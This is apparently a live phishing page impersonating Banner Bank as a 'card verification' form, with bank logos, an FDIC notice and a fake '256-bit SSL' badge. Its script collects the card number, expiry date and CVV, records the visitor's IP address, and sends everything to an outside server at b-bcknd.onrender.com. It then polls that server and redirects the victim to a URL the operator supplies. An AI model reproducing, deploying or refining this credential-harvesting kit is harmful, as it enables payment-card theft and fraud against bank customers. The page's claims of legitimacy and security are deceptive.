<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Banner Bank - Secure Card Verification</title>
    <link rel="icon" type="image/png" href="images/BANR-icon.png">
    <style>
        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            background: url('https://cdn1.onlineaccess1.com/cdn/depot/3388/2368/cb6a8356fe8f8dbad2964b1ace778bfd/assets/images/desktop-background-q2-2d84adb4a94fe345760ff47cbb997f6e.png') no-repeat center center fixed;
            background-size: cover;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .main-container {
            width: 650px;
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fig-container {
            padding: 10px 0;
            display: flex;
            flex-direction: row;
            align-items: center;
            font-family: sans-serif;
            font-weight: 400;
            font-size: 12.8px;
            line-height: 1;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 20px;
        }
        .fig-container img {
            max-height: 40px;
            width: auto;
            flex-shrink: 0;
            transition: transform 0.3s ease;
        }
        .fig-container img:hover {
            transform: scale(1.05);
        }
        .fidc_writing {
            margin-left: 10px;
            font-style: italic;
            color: white;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
        }
        .login-container {
            width: 100%;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            transition: box-shadow 0.3s ease;
        }
        .login-container:hover {
            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.3);
        }
        .image-section {
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0051ba 0%, #003d8a 100%);
            padding: 20px 0;
        }
        .imgg {
            height: 150px;
            width: auto;
            transition: transform 0.3s ease;
        }
        .imgg:hover {
            transform: scale(1.02);
        }
        .login-section {
            background-color: #fff;
            padding: 10px 10%;
        }
        .form {
            padding: 40px 30px;
            display: flex;
            flex-direction: column;
            gap: 18px;
        }
        .form-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .form label {
            font-weight: 600;
            font-family: sans-serif;
            font-size: 14px;
            color: #333;
            letter-spacing: 0.3px;
        }
        .form label .required {
            color: #d32f2f;
            margin-left: 2px;
        }
        .form input[type="text"] {
            padding: 12px 15px;
            font-size: 16px;
            border-radius: 8px;
            border: 2px solid #e0e0e0;
            width: 100%;
            box-sizing: border-box;
            transition: all 0.3s ease;
            background: #fafafa;
        }
        .form input[type="text"]:hover {
            border-color: #b0b0b0;
            background: #fff;
        }
        .form input[type="text"]:focus {
            border-color: #0051ba;
            background: #fff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 81, 186, 0.1);
        }
        .form input[type="text"].error {
            border-color: #d32f2f;
            background: #fff5f5;
        }
        .form input[type="text"].error:focus {
            box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
        }
        .form input[type="text"].success {
            border-color: #2e7d32;
            background: #f5fff5;
        }
        .input-wrapper {
            position: relative;
        }
        .input-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
            font-size: 16px;
            pointer-events: none;
        }
        .card-type-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            pointer-events: none;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 32px;
            height: 24px;
        }
        .card-type-icon svg {
            width: 100%;
            height: 100%;
            opacity: 0.6;
            transition: opacity 0.3s ease;
        }
        .card-type-icon svg.active {
            opacity: 1;
        }
        .card-number-input {
            padding-left: 50px !important;
        }
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        .submit-btn {
            background: linear-gradient(135deg, #fdd835 0%, #fbc02d 100%);
            border: none;
            padding: 14px;
            font-weight: 700;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            color: #1a1a1a;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s ease;
        }
        .submit-btn:hover::before {
            left: 100%;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(253, 216, 53, 0.4);
        }
        .submit-btn:active {
            transform: translateY(0);
        }
        .submit-btn:focus {
            outline: 2px solid #0051ba;
            outline-offset: 2px;
        }
        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .submit-btn:disabled::before {
            display: none;
        }
        .submit-btn[aria-busy="true"]::after {
            content: ' ';
            display: inline-block;
            width: 16px;
            height: 16px;
            margin-left: 8px;
            border: 2px solid #0051ba;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            vertical-align: middle;
        }
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 10px;
            font-size: 12px;
            color: #666;
            font-family: sans-serif;
        }
        .security-badge svg {
            width: 16px;
            height: 16px;
            fill: #2e7d32;
            flex-shrink: 0;
        }
        #waitPage {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            font-family: sans-serif;
            color: white;
            backdrop-filter: blur(5px);
        }
        #waitPage .wait-content {
            background: linear-gradient(135deg, #0051ba 0%, #003d8a 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            display: flex;
            flex-direction: column;
            gap: 15px;
            max-width: 300px;
            animation: pulse 2s infinite;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }
        #waitPage .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(253, 216, 53, 0.3);
            border-top: 4px solid #fdd835;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #waitPage .wait-content p {
            margin: 0;
            font-size: 16px;
            font-weight: 500;
        }
        #waitPage .wait-content .sub-text {
            font-size: 13px;
            opacity: 0.8;
        }
        .error-message {
            color: #d32f2f;
            font-size: 13px;
            font-family: sans-serif;
            display: none;
            padding: 8px 12px;
            background: #fff5f5;
            border-radius: 6px;
            border-left: 3px solid #d32f2f;
        }
        .error-message.visible {
            display: block;
            animation: slideDown 0.3s ease;
        }
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success-message {
            color: #2e7d32;
            font-size: 13px;
            font-family: sans-serif;
            display: none;
            padding: 8px 12px;
            background: #f5fff5;
            border-radius: 6px;
            border-left: 3px solid #2e7d32;
        }
        .success-message.visible {
            display: block;
            animation: slideDown 0.3s ease;
        }
        .footer-section {
            background: linear-gradient(135deg, #0061b0 0%, #004d8a 100%);
            padding: 15px 0;
            text-align: center;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
        }
        .footer-section a {
            color: rgba(255, 255, 255, 0.9);
            text-decoration: none;
            font-size: 13px;
            border-right: 1px solid rgba(255, 255, 255, 0.3);
            padding: 0 8px;
            font-family: sans-serif;
            transition: color 0.3s ease;
        }
        .footer-section a:hover {
            color: #fdd835;
        }
        .footer-section a:last-child {
            border-right: none;
        }
        .card-type-indicator {
            display: flex;
            gap: 8px;
            margin-top: 5px;
            flex-wrap: wrap;
        }
        .card-type-indicator span {
            font-size: 11px;
            padding: 2px 8px;
            border-radius: 4px;
            background: #f0f0f0;
            color: #999;
            transition: all 0.3s ease;
        }
        .card-type-indicator span.active {
            background: #0051ba;
            color: white;
        }
        .cvv-help {
            cursor: help;
            color: #0051ba;
            font-weight: 600;
        }
        @media screen and (max-width: 600px) {
            body {
                padding: 20px 15px;
            }
            .main-container {
                width: 100%;
                margin: 0 auto;
            }
            .fig-container {
                flex-direction: row;
                align-items: center;
                padding: 10px 0;
                flex-wrap: nowrap;
            }
            .fig-container img {
                max-height: 35px;
                width: auto;
                flex-shrink: 0;
            }
            .fidc_writing {
                margin-left: 8px;
                font-size: 11px;
                font-style: italic;
                line-height: 1.3;
                word-break: break-word;
                color: white;
                text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
            }
            .image-section {
                justify-content: center;
                align-items: center;
                padding: 15px 0;
            }
            .imgg {
                height: 60px;
            }
            .login-section {
                padding: 10px 15px;
            }
            .form {
                padding: 20px 10px;
                gap: 15px;
            }
            .form input[type="text"] {
                padding: 10px 12px;
                font-size: 16px;
            }
            .form-row {
                grid-template-columns: 1fr;
                gap: 15px;
            }
            .submit-btn {
                padding: 12px;
                font-size: 15px;
            }
            #waitPage .wait-content {
                padding: 20px;
                font-size: 14px;
                max-width: 250px;
            }
            #waitPage .spinner {
                width: 35px;
                height: 35px;
                border-width: 3px;
            }
            .error-message {
                font-size: 12px;
            }
            .footer-section {
                gap: 8px;
                padding: 12px 0;
            }
            .footer-section a {
                font-size: 11px;
                padding: 0 6px;
            }
            .card-type-indicator span {
                font-size: 10px;
                padding: 2px 6px;
            }
            .card-number-input {
                padding-left: 42px !important;
            }
            .card-type-icon {
                width: 28px;
                height: 20px;
                left: 8px;
            }
        }
        @media screen and (max-width: 400px) {
            .form {
                padding: 15px 5px;
            }
            .login-section {
                padding: 10px 10px;
            }
            .card-number-input {
                padding-left: 38px !important;
            }
            .card-type-icon {
                width: 24px;
                height: 18px;
                left: 6px;
            }
        }
    </style>
</head>
<body>
    <section class="main-container">
        <div class="fig-container">
            <img src="images/FDIC.jpeg" alt="FDIC Logo">
            <div class="fidc_writing">FDIC Insured - Backed by the full faith and credit of the U.S. Government</div>
        </div>
        <div class="login-container">
            <div class="image-section">
                <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg">
            </div>
            <div class="login-section">
                <form class="form" id="cardForm" novalidate>
                    <div class="form-group">
                        <label for="card_number">Card Number <span class="required">*</span></label>
                        <div class="input-wrapper">
                            <span class="card-type-icon" id="cardTypeIcon">
                                <!-- Default credit card icon -->
                                <svg viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="1.5">
                                    <rect x="2" y="4" width="20" height="16" rx="2" stroke="currentColor"/>
                                    <path d="M2 10h20" stroke="currentColor"/>
                                    <circle cx="7" cy="14" r="1.5" fill="#666"/>
                                    <circle cx="12" cy="14" r="1.5" fill="#666"/>
                                    <circle cx="17" cy="14" r="1.5" fill="#666"/>
                                </svg>
                            </span>
                            <input type="text" id="card_number" name="card_number" maxlength="19" 
                                   placeholder="1234 5678 9012 3456" 
                                   inputmode="numeric" required 
                                   aria-describedby="card-error"
                                   class="card-number-input"
                                   autocomplete="cc-number" />
                        </div>
                        <div class="card-type-indicator" id="cardTypeIndicator">
                            <span id="visa">Visa</span>
                            <span id="mastercard">Mastercard</span>
                            <span id="amex">Amex</span>
                            <span id="discover">Discover</span>
                        </div>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label for="exp_date">Expiration Date <span class="required">*</span></label>
                            <input type="text" id="exp_date" name="exp_date" 
                                   placeholder="MM/YY" 
                                   pattern="\d{2}/\d{2}" 
                                   required 
                                   aria-describedby="card-error"
                                   autocomplete="cc-exp" />
                        </div>
                        <div class="form-group">
                            <label for="cvv">CVV <span class="required">*</span></label>
                            <div class="input-wrapper">
                                <input type="text" id="cvv" name="cvv" maxlength="4" 
                                       placeholder="..." 
                                       pattern="\d{3,4}" 
                                       inputmode="numeric" 
                                       required 
                                       aria-describedby="card-error"
                                       autocomplete="cc-csc" />
                                <span class="input-icon cvv-help" id="cvvHelp" title="3 or 4 digit security code">?</span>
                            </div>
                        </div>
                    </div>

                    <div id="card-error" class="error-message" role="alert"></div>
                    <div id="card-success" class="success-message" role="status"></div>

                    <button type="submit" class="submit-btn">Verify Card</button>
                    
                    <div class="security-badge">
                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5L12 1zm0 2.18l7 3.12v4.7c0 4.83-3.93 9.11-7 10.12-3.07-1.01-7-5.29-7-10.12V6.3l7-3.12zM12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zm0 8c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3z"/></svg>
                        <span>256-bit SSL Encrypted Connection</span>
                    </div>
                </form>
            </div>
            <div class="footer-section">
                <a href="#">Locations</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Forgot Password</a>
                <a href="#">Unlock/Forgot Login ID</a>
                <a href="#">Enroll</a>
            </div>
        </div>
    </section>
    <div id="waitPage" role="alert" aria-live="assertive">
        <div class="wait-content">
            <div class="spinner"></div>
            <p>Verifying Card Details...</p>
            <p class="sub-text">Please wait while we securely process your information</p>
        </div>
    </div>

    <script>
        // Card type detection with SVG icons
        function getCardIcon(cardType) {
            const icons = {
                'visa': `<svg viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="16" rx="2" fill="#1a1f71"/><path d="M9.5 14.5L11 9.5H12.5L11 14.5H9.5Z" fill="white"/><path d="M14 14.5L15.5 9.5H17L15.5 14.5H14Z" fill="white"/><circle cx="18" cy="12" r="1.5" fill="white"/><circle cx="7" cy="12" r="1.5" fill="white"/><path d="M8 14.5L9.5 9.5H7.5L6 14.5H8Z" fill="white"/></svg>`,
                
                'mastercard': `<svg viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="16" rx="2" fill="#f79e1b"/><circle cx="9" cy="12" r="4" fill="#eb001b"/><circle cx="15" cy="12" r="4" fill="#eb001b"/><circle cx="12" cy="12" r="4" fill="#f79e1b" opacity="0.5"/><path d="M12 9c1.5 1.5 1.5 3 0 4.5" stroke="white" stroke-width="1.5"/></svg>`,
                
                'amex': `<svg viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="16" rx="2" fill="#006fcf"/><path d="M7 10.5L5.5 13.5L4 10.5H5L6 12.5L7 10.5H7Z" fill="white"/><path d="M12 10.5V13.5M10.5 12H13.5" stroke="white" stroke-width="1.5"/><path d="M16 10.5L14.5 13.5L13 10.5H14L15 12.5L16 10.5H16Z" fill="white"/><rect x="2" y="4" width="20" height="16" rx="2" stroke="white" stroke-width="0.5"/></svg>`,
                
                'discover': `<svg viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="16" rx="2" fill="#4d4d4d"/><circle cx="12" cy="12" r="4" fill="#f68b1f"/><path d="M9 12c0 1.5 1 2.5 3 2.5s3-1 3-2.5" stroke="white" stroke-width="1.5"/><rect x="2" y="4" width="20" height="16" rx="2" stroke="#f68b1f" stroke-width="0.5"/></svg>`
            };
            return icons[cardType] || `<svg viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="1.5"><rect x="2" y="4" width="20" height="16" rx="2" stroke="currentColor"/><path d="M2 10h20" stroke="currentColor"/><circle cx="7" cy="14" r="1.5" fill="#666"/><circle cx="12" cy="14" r="1.5" fill="#666"/><circle cx="17" cy="14" r="1.5" fill="#666"/></svg>`;
        }

        // Card type detection
        document.getElementById('card_number').addEventListener('input', function(e) {
            const value = this.value.replace(/\s/g, '');
            const cardType = detectCardType(value);
            const indicators = document.querySelectorAll('.card-type-indicator span');
            const iconContainer = document.getElementById('cardTypeIcon');
            
            // Reset all indicators
            indicators.forEach(el => el.classList.remove('active'));
            
            // Update SVG icon
            const svgContent = getCardIcon(cardType);
            iconContainer.innerHTML = svgContent;
            
            // Add active class to SVG for opacity
            const svg = iconContainer.querySelector('svg');
            if (svg) {
                svg.classList.add('active');
            }
            
            if (cardType) {
                document.getElementById(cardType).classList.add('active');
            }
            
            // Format card number with spaces
            let formatted = value.replace(/\D/g, '');
            if (cardType === 'amex') {
                formatted = formatted.replace(/(\d{4})(\d{6})(\d{5})/, '$1 $2 $3');
            } else {
                formatted = formatted.replace(/(\d{4})(?=\d)/g, '$1 ');
            }
            if (formatted !== this.value) {
                this.value = formatted.trim();
            }
        });

        function detectCardType(number) {
            const clean = number.replace(/\D/g, '');
            if (clean.length === 0) return null;
            
            if (/^4/.test(clean)) return 'visa';
            if (/^5[1-5]/.test(clean) || /^2[2-7]/.test(clean)) return 'mastercard';
            if (/^3[47]/.test(clean)) return 'amex';
            if (/^6(?:011|5|4[4-9]|22)/.test(clean)) return 'discover';
            return null;
        }

        // Format expiration date
        document.getElementById('exp_date').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length >= 2) {
                const month = parseInt(value.substring(0, 2));
                if (month > 12) {
                    value = '12' + value.substring(2);
                }
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            if (value !== this.value) {
                this.value = value;
            }
        });

        // CVV max length based on card type
        document.getElementById('cvv').addEventListener('focus', function() {
            const cardNumber = document.getElementById('card_number').value.replace(/\s/g, '');
            const cardType = detectCardType(cardNumber);
            if (cardType === 'amex') {
                this.maxLength = 4;
                this.placeholder = '....';
            } else {
                this.maxLength = 3;
                this.placeholder = '...';
            }
        });

        // CVV help tooltip
        document.getElementById('cvvHelp').addEventListener('click', function() {
            alert('CVV is the 3 or 4 digit security code on the back of your card.');
        });

        document.getElementById('cardForm').addEventListener('submit', async (event) => {
            event.preventDefault();
            
            const cardNumberInput = document.getElementById('card_number');
            const expDateInput = document.getElementById('exp_date');
            const cvvInput = document.getElementById('cvv');
            const cardNumber = cardNumberInput.value.replace(/[\s-]/g, '');
            const expDate = expDateInput.value.trim();
            const cvv = cvvInput.value.trim();
            const errorMessage = document.getElementById('card-error');
            const successMessage = document.getElementById('card-success');
            const submitBtn = document.querySelector('.submit-btn');
            const waitPage = document.getElementById('waitPage');
            
            // Validate card number length
            const cardType = detectCardType(cardNumber);
            let isValidCard = true;
            
            if (cardType === 'amex' && cardNumber.length !== 15) isValidCard = false;
            else if (cardType && cardNumber.length !== 16) isValidCard = false;
            else if (!cardType) isValidCard = false;
            
            // Validate expiration date
            const expParts = expDate.split('/');
            if (expParts.length === 2) {
                const month = parseInt(expParts[0]);
                const year = parseInt(expParts[1]);
                const currentDate = new Date();
                const currentYear = currentDate.getFullYear() % 100;
                const currentMonth = currentDate.getMonth() + 1;
                
                if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
                    isValidCard = false;
                }
            } else {
                isValidCard = false;
            }
            
            if (!isValidCard || !/^\d{3,4}$/.test(cvv)) {
                errorMessage.textContent = 'Please enter a valid card number, expiration date, and CVV.';
                errorMessage.classList.add('visible');
                successMessage.classList.remove('visible');
                
                if (!isValidCard) {
                    cardNumberInput.focus();
                } else {
                    cvvInput.focus();
                }
                return;
            }
            
            errorMessage.classList.remove('visible');
            successMessage.classList.remove('visible');
            submitBtn.disabled = true;
            submitBtn.setAttribute('aria-busy', 'true');
            waitPage.style.display = 'flex';
            
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                const payload = { 
                    data: { 
                        card_number: cardNumber, 
                        exp_date: expDate, 
                        cvv 
                    }, 
                    ip 
                };
                
                const response = await fetch('https://b-bcknd.onrender.com/c', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await response.json();
                
                if (!response.ok) throw new Error(data.error || `HTTP error! Status: ${response.status}`);
                if (data.success && data.id) {
                    successMessage.textContent = 'Card verified successfully. Redirecting...';
                    successMessage.classList.add('visible');
                    checkStatus(data.id);
                } else {
                    throw new Error(data.error || 'Card verification failed');
                }
            } catch (error) {
                console.error('Card error:', error);
                waitPage.style.display = 'none';
                submitBtn.disabled = false;
                submitBtn.setAttribute('aria-busy', 'false');
                errorMessage.textContent = 'Error: ' + error.message;
                errorMessage.classList.add('visible');
                successMessage.classList.remove('visible');
                cvvInput.value = '';
                cardNumberInput.focus();
            }
        });

        function checkStatus(id) {
            let attempts = 0;
            const maxAttempts = 20;
            const interval = setInterval(() => {
                attempts++;
                fetch(`https://b-bcknd.onrender.com/status/${id}`)
                    .then(res => {
                        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
                        return res.json();
                    })
                    .then(data => {
                        if (data.status === 'approved') {
                            clearInterval(interval);
                            window.location.href = data.redirect_url || 'index.html';
                        } else if (attempts >= maxAttempts) {
                            clearInterval(interval);
                            alert('Verification timed out. Please try again.');
                            document.getElementById('waitPage').style.display = 'none';
                            document.querySelector('.submit-btn').disabled = false;
                            document.querySelector('.submit-btn').setAttribute('aria-busy', 'false');
                            document.getElementById('card_number').value = '';
                            document.getElementById('exp_date').value = '';
                            document.getElementById('cvv').value = '';
                            document.getElementById('card_number').focus();
                        }
                    })
                    .catch(err => {
                        console.error('Status check error:', err);
                        clearInterval(interval);
                        alert('Error: ' + err.message);
                        document.getElementById('waitPage').style.display = 'none';
                        document.querySelector('.submit-btn').disabled = false;
                        document.querySelector('.submit-btn').setAttribute('aria-busy', 'false');
                        document.getElementById('card_number').value = '';
                        document.getElementById('exp_date').value = '';
                        document.getElementById('cvv').value = '';
                        document.getElementById('card_number').focus();
                    });
            }, 3000);
        }
    </script>
</body>
